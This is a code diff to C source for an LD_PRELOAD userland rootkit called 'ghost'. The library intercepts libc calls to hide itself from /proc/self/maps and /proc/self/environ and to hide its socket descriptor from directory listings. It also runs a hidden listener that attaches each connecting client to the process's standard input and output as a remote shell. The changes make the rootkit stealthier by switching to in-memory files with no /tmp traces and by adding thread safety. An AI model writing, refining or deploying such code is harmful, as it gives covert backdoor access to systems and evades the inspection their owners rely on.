@@ -19,9 +19,10 @@
 #include <stdarg.h>
 #include <sys/wait.h>
 #include <sys/types.h>
+#include <sys/mman.h>
 
-static int ghost_fd = -1;
-static int should_run = 1;
+static volatile int ghost_fd = -1;
+static volatile int should_run = 1;
 
 typedef int (*bind_t)(int, const struct sockaddr *, socklen_t);
 typedef struct dirent* (*readdir_t)(DIR *);
@@ -31,6 +32,7 @@ typedef ssize_t (*read_t)(int, void *, size_t);
 typedef ssize_t (*write_t)(int, const void *, size_t);
 typedef int (*close_t)(int);
 typedef int (*setsockopt_t)(int, int, int, const void *, socklen_t);
+typedef int (*memfd_create_t)(const char *, unsigned int);
 
 static bind_t real_bind = NULL;
 static readdir_t real_readdir = NULL;
@@ -40,6 +42,9 @@ static read_t real_read = NULL;
 static write_t real_write = NULL;
 static close_t real_close = NULL;
 static setsockopt_t real_setsockopt = NULL;
+static memfd_create_t real_memfd_create = NULL;
+
+static pthread_mutex_t ghost_fd_mutex = PTHREAD_MUTEX_INITIALIZER;
 
 static int init_libc_funcs(void) {
     real_bind = (bind_t)dlsym(RTLD_NEXT, "bind");
@@ -50,6 +55,7 @@ static int init_libc_funcs(void) {
     real_write = (write_t)dlsym(RTLD_NEXT, "write");
     real_close = (close_t)dlsym(RTLD_NEXT, "close");
     real_setsockopt = (setsockopt_t)dlsym(RTLD_NEXT, "setsockopt");
+    real_memfd_create = (memfd_create_t)dlsym(RTLD_NEXT, "memfd_create");
     return 0;
 }
 
@@ -57,6 +63,28 @@ static int is_ghost_path(const char *path) {
     if (!path) return 0;
     return (strstr(path, "/proc/self/maps") != NULL ||
             strstr(path, "/proc/self/environ") != NULL);
+}
+
+static int create_filtered_memfd(const char *content, size_t len) {
+    if (!real_memfd_create) {
+        if (!real_close) init_libc_funcs();
+        return -1;
+    }
+    
+    int fd = real_memfd_create("ghost_filtered", MFD_CLOEXEC);
+    if (fd < 0) return -1;
+    
+    if (real_write(fd, content, len) != (ssize_t)len) {
+        real_close(fd);
+        return -1;
+    }
+    
+    if (lseek(fd, 0, SEEK_SET) < 0) {
+        real_close(fd);
+        return -1;
+    }
+    
+    return fd;
 }
 
 static char *filter_environ(const char *path) {
@@ -137,27 +165,19 @@ int open(const char *path, int flags, ...) {
     if (is_ghost_path(path)) {
         if (strstr(path, "environ") != NULL) {
             char *filtered = filter_environ(path);
-            if (filtered) {
-                static char stored_path[256];
-                snprintf(stored_path, sizeof(stored_path), "/tmp/.ghost_environ_%d", getpid());
-                int wfd = real_open(stored_path, O_WRONLY | O_CREAT | O_TRUNC, 0644);
-                if (wfd >= 0) {
-                    real_write(wfd, filtered, strlen(filtered));
-                    real_close(wfd);
-                    return real_open(stored_path, flags, mode);
+            if (filtered && *filtered) {
+                int memfd = create_filtered_memfd(filtered, strlen(filtered));
+                if (memfd >= 0) {
+                    return memfd;
                 }
             }
         }
         else if (strstr(path, "maps") != NULL) {
             char *filtered = filter_maps(path);
-            if (filtered) {
-                static char stored_path[256];
-                snprintf(stored_path, sizeof(stored_path), "/tmp/.ghost_maps_%d", getpid());
-                int wfd = real_open(stored_path, O_WRONLY | O_CREAT | O_TRUNC, 0644);
-                if (wfd >= 0) {
-                    real_write(wfd, filtered, strlen(filtered));
-                    real_close(wfd);
-                    return real_open(stored_path, flags, mode);
+            if (filtered && *filtered) {
+                int memfd = create_filtered_memfd(filtered, strlen(filtered));
+                if (memfd >= 0) {
+                    return memfd;
                 }
             }
         }
@@ -169,11 +189,13 @@ int open(const char *path, int flags, ...) {
 struct dirent *readdir(DIR *dirp) {
     if (!real_readdir) real_readdir = (readdir_t)dlsym(RTLD_NEXT, "readdir");
 
+    int fd_to_hide = ghost_fd;
+    
     struct dirent *entry;
     while ((entry = real_readdir(dirp))) {
-        if (ghost_fd != -1) {
+        if (fd_to_hide != -1) {
             char fd_str[16];
-            snprintf(fd_str, sizeof(fd_str), "%d", ghost_fd);
+            snprintf(fd_str, sizeof(fd_str), "%d", fd_to_hide);
             if (strcmp(entry->d_name, fd_str) == 0) continue; 
         }
         break;
@@ -222,8 +244,6 @@ void *ghost_listener(void *arg) {
     server_fd = socket(AF_INET, SOCK_STREAM, 0);
     if (server_fd < 0) return NULL;
     
-    ghost_fd = server_fd;
-    
     int flags = fcntl(server_fd, F_GETFD, 0);
     if (flags >= 0) fcntl(server_fd, F_SETFD, flags | FD_CLOEXEC);
 
@@ -241,22 +261,23 @@ void *ghost_listener(void *arg) {
     if (real_bind) {
         if (real_bind(server_fd, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
             close(server_fd);
-            ghost_fd = -1;
             return NULL;
         }
     } else {
         if (bind(server_fd, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
             close(server_fd);
-            ghost_fd = -1;
             return NULL;
         }
     }
     
     if (listen(server_fd, 3) < 0) {
         close(server_fd);
-        ghost_fd = -1;
         return NULL;
     }
+    
+    pthread_mutex_lock(&ghost_fd_mutex);
+    ghost_fd = server_fd;
+    pthread_mutex_unlock(&ghost_fd_mutex);
 
     while (should_run) {
         tv.tv_sec = 1;
@@ -282,7 +303,10 @@ void *ghost_listener(void *arg) {
         if (client_fd >= 0) {
             pid_t pid = fork();
             if (pid == 0) {
-                close(server_fd);
+                pthread_mutex_lock(&ghost_fd_mutex);
+                int my_ghost_fd = ghost_fd;
+                pthread_mutex_unlock(&ghost_fd_mutex);
+                if (my_ghost_fd >= 0) close(my_ghost_fd);
                 unsetenv("LD_PRELOAD");
                 dup2(client_fd, 0); dup2(client_fd, 1); dup2(client_fd, 2);
                 close(client_fd);
@@ -294,10 +318,13 @@ void *ghost_listener(void *arg) {
         }
     }
     
+    pthread_mutex_lock(&ghost_fd_mutex);
     if (ghost_fd == server_fd) {
         close(server_fd);
         ghost_fd = -1;
     }
+    pthread_mutex_unlock(&ghost_fd_mutex);
+    
     return NULL;
 }
 
@@ -328,8 +355,10 @@ void init_ghost(void) {
 __attribute__((destructor))
 void cleanup_ghost(void) {
     should_run = 0;
+    pthread_mutex_lock(&ghost_fd_mutex);
     if (ghost_fd >= 0) {
         close(ghost_fd);
         ghost_fd = -1;
     }
+    pthread_mutex_unlock(&ghost_fd_mutex);
 }
